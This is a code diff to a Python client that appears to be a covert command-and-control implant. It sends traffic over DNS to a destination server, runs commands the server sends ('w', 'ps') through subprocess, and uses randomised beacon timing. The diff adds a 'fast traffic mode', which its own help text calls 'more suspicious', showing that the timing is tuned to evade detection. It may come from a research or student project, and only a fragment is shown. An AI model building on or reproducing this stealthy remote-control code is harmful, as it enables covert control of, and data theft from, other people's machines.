@@ -20,10 +20,8 @@ class Client:
         self.server_port = args.port
         self.server_ip = args.destination
         self.source_port = args.source_port
+        self.fast_traffic = args.fast
 
-        # TODO: Change back... to [20, 100], [5,10]
-        self.idle_timing = [5, 10]
-        self.sending_timing = [1, 2]
         self.sending_data = False
         self.segments_to_send = []
         self.curr_seg_to_send = 0
@@ -37,6 +35,18 @@ class Client:
         self.__log("Initialized DNS sender with nameserver: {}".format(self.sender.nameserver_ports))
 
         self.running = False
+
+    def get_timings(self):
+        if self.fast_traffic:
+            if self.sending_data:
+                return [1, 2]
+            else:
+                return [5, 10]
+        else:
+            if self.sending_data:
+                return [5, 10]
+            else:
+                return [20, 100]
 
     def __log(self, message):
         if self.silent:
@@ -55,10 +65,7 @@ class Client:
         return answer == serv_to_client["ACK"]
 
     def do_sleep(self):
-        if self.sending_data:
-            minim, maxim = self.sending_timing
-        else:
-            minim, maxim = self.idle_timing
+        minim, maxim = self.get_timings()
 
         ran = random.gauss((maxim + minim) / 2, math.log2(maxim - minim))
         t = max(minim, min(maxim, ran))
@@ -110,7 +117,6 @@ class Client:
                 output = subprocess.check_output(['w', '-o'])
             elif command == serv_to_client["PS"]:
                 output = subprocess.check_output(['ps', 'au'])
-
             else:
                 self.__log("Unknown command: {}".format(command))
                 return
@@ -224,8 +230,9 @@ if __name__ == '__main__':
                         default="heslo")
     parser.add_argument("-s", "--silent", help="Hide detailed debug info", type=bool, default=False)
     parser.add_argument("-d", "--destination", help="Destination server IP", type=str, default="127.0.0.1")
-    parser.add_argument("-p", "--port", help="Destination server port", type=int, default=51271)  # TODO: Arbitrary...
-    parser.add_argument("-sp", "--source-port", help="Source port", type=int, default=51272)  # TODO: Arbitrary
+    parser.add_argument("-p", "--port", help="Destination server port", type=int, default=51271)
+    parser.add_argument("-sp", "--source-port", help="Source port", type=int, default=51272)
+    parser.add_argument("-f", "--fast", help="Fast traffic mode (more suspicious)", action="store_true")
     args = parser.parse_args()
 
     client = Client(args)
